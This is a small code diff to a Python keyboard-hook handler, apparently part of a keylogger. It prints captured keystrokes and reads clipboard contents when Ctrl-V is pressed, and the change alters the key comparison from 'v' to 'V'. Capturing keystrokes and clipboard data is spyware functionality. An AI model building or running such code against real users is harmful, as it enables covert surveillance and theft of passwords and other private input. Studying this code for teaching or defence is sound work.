@@ -53,7 +53,7 @@ def KeyStroke(event):
         print(chr(event.Ascii))
     else:
         #如果是输入为[Ctrl-V]，则获得剪切板内容
-        if event.Key=="v":
+        if event.Key=="V":
             win32clipboard.OpenClipboard()
             pasted_value=win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
